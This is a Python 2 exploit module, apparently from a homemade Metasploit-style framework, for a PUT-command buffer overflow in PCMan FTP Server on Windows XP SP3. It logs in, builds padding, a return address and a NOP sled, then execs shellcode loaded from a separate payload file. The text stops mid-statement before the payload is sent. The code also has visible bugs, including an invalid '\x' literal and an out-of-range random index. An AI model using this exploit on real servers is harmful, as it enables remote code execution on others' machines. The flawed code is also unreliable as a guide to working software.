import ftplib
import cmd
import random
from socket import AF_INET, SOCK_STREAM, socket, gethostbyname

def getToken(line):
    token = ""
    for letter in line:
        if letter != " ":
            token += letter
        else:
            break
    return token

class pcmanPutOverflowMenu(cmd.Cmd):
  def __init__(self):
    cmd.Cmd.__init__(self)
    self.user = ["anonymous"]
    self.passwd = ["anonymous@example.com"]
    self.host = ["ftp.debian.org"]
  def help_help(self):
    print "Usage: help [cmd]"
    print "cmd    the command to get help on"
    print "help: show help on a command or list commands"
  def help_set(self):
    print "Usage: set [var] = [val]"
    print "var    variable to set"
    print "val    value to set variable to"
    print "set: set a variable to a value"
    print "Note: you MUST use it exactly as shown: no set [var]=[val]!"
  def do_set(self, args):
    var = getToken(args)
    val = args[len(var) + 3:]
    if var == "user":
      self.user[0] = val
    elif var == "passwd":
      self.passwd[0] = val
    elif var == "host":
      self.host[0] = val
    else:
      print "*** Variable not found %s" % var
      return
    print "[*]%s => %s" % (var, val)
  def help_show(self):
    print "Usage: show options"
    print "show options: show the variables, current values, and descriptions"
  def do_show(self, args):
    print "Target: Windows XP SP3 English"
    print "Options for pcman_put_overflow:"
    print "========================"
    print "user    %s    the user to login in as" % self.user[0]
    print "passwd    %s    the password of the user" % self.passwd[0]
    print "host    %s    the IP of the target"
  def help_exit(self):
    print "Usage: exit"
    print "exit: exit the pcman_put_overflow context"
  def do_exit(self, args):
    if args:
      return
    return True
  def help_start(self):
    print "Usage: start"
    print "start: start the attack"
  def do_start(self, args):
    for let in "abcdefghijklmnopqrstuvwxyz":
      if let in self.host[0]:
        self.host[0] = gethostbyname(self.host[0])
      ftp = ftplib.FTP(self.host[0])
    try:
     ftp.login(self.user[0], self.passwd[0])
     print "[+]Login successful on %s" % self.host[0]
    except:
      print "[-]Login unsuccessful on %s" % self.host[0]
      return
    print "[*]Generating payload..."
    char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
    payload = ""
    for a in range(0, 2017):
      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
    payload += "\x77\xc3\x54\x59"
    payload += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    exec(open("../../../payloads/pcman_put.shell", "r").read())
    print "[+]Payload generated."
    print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
    ftp.
